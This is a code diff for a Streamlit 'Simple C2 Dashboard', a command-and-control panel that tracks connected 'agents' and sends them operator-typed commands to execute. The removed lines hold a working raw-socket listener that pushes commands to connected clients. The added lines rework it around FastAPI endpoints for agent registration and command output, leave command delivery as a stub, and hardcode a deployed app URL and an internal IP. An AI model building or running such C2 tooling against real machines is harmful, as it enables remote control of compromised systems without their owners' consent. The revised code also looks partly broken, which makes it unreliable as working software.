@@ -1,62 +1,55 @@
 import streamlit as st
-import socket
-import threading
-import time
+from fastapi import FastAPI
+from threading import Thread
+import uvicorn
 
-# Simple C2 Server Implementation
+# Initialize Streamlit app configuration
 st.set_page_config(layout="wide", page_title="Simple C2 Dashboard")
 
-# Function to get master node IP address
-def get_master_ip():
-    # Determine the IP address that can be used by other devices to connect
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        ip_address = s.getsockname()[0]
-    except Exception:
-        ip_address = "127.0.0.1"
-    finally:
-        s.close()
-    return ip_address
+# FastAPI app setup
+app = FastAPI()
 
-# Display Master Node IP in the Sidebar
-master_ip = get_master_ip()
-st.sidebar.write(f"Master Node IP Address: {master_ip}")
-
-# Sidebar - App title and input widgets
+# Sidebar - App title and master information
+master_url = "https://m-dashboardpy-app9jfrumktgxrf359vu6t6.streamlit.app/"
+master_ip = "10.12.175.191"
 st.sidebar.title("Simple Command & Control (C2) Dashboard")
-
-# Columns Layout
-col1, col2 = st.columns([1, 2])
+st.sidebar.write("Master Node URL:")
+st.sidebar.write(master_url)
+st.sidebar.write("Master Node IP Address:")
+st.sidebar.write(master_ip)
 
 # Placeholder for connected agents
-targets = []
+targets = {}
 
-# Function to start the server and listen for connections
-def start_server(host, port):
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((host, port))
-    server.listen()
-    while True:
-        client, address = server.accept()
-        targets.append((client, address))
-        st.session_state['logs'] += f"\n[+] Connection established from {address}"
+# FastAPI endpoint to register agents
+@app.post("/register_agent/")
+async def register_agent(agent_id: str):
+    if agent_id not in targets:
+        targets[agent_id] = "Connected"
+        st.session_state['logs'] += f"\n[+] Agent {agent_id} connected"
+    return {"message": f"Agent {agent_id} registered successfully"}
 
-# Start server in a separate thread
-def run_server():
-    threading.Thread(target=start_server, args=("0.0.0.0", 9999), daemon=True).start()
+# FastAPI endpoint to receive command output from agent
+@app.post("/command_response/")
+async def command_response(agent_id: str, response: str):
+    st.session_state['logs'] += f"\n[+] Response from Agent {agent_id}: {response}"
+    return {"message": "Response received successfully"}
 
-# Start server if not already started
-if 'logs' not in st.session_state:
-    st.session_state['logs'] = "[INFO] Starting Simple C2 Server..."
-    run_server()
+# Run FastAPI server in a separate thread
+def run_fastapi():
+    uvicorn.run(app, host="0.0.0.0", port=8000)
+
+Thread(target=run_fastapi, daemon=True).start()
+
+# Streamlit UI for connected agents and command execution
+col1, col2 = st.columns([1, 2])
 
 # Column 1 - Connected Agents
 with col1:
     st.subheader("Connected Agents")
     if targets:
-        for i, target in enumerate(targets):
-            st.write(f"Agent {i+1}: {target[1]}")
+        for agent_id in targets:
+            st.write(f"Agent: {agent_id}")
     else:
         st.write("No agents connected.")
 
@@ -64,17 +57,14 @@ with col1:
 with col2:
     st.subheader("Command Execution")
     if targets:
-        selected_agent = st.selectbox("Select Agent", options=[f"Agent {i+1}" for i in range(len(targets))])
+        selected_agent = st.selectbox("Select Agent", options=list(targets.keys()))
         command = st.text_input("Enter Command to Execute")
         if st.button("Send Command"):
-            agent_index = int(selected_agent.split()[1]) - 1
-            client_socket = targets[agent_index][0]
-            try:
-                client_socket.send(command.encode())
-                st.session_state['logs'] += f"\n[+] Sent command to {targets[agent_index][1]}: {command}"
-            except Exception as e:
-                st.session_state['logs'] += f"\n[ERROR] Failed to send command: {str(e)}"
+            st.session_state['logs'] += f"\n[+] Command sent to {selected_agent}: {command}"
+            # Here you would implement the logic to send command to agent (e.g., using an HTTP request)
 
 # Display Logs
 st.subheader("Logs")
+if 'logs' not in st.session_state:
+    st.session_state['logs'] = "[INFO] Starting Simple C2 Server..."
 st.text_area("Logs", st.session_state['logs'], height=300)
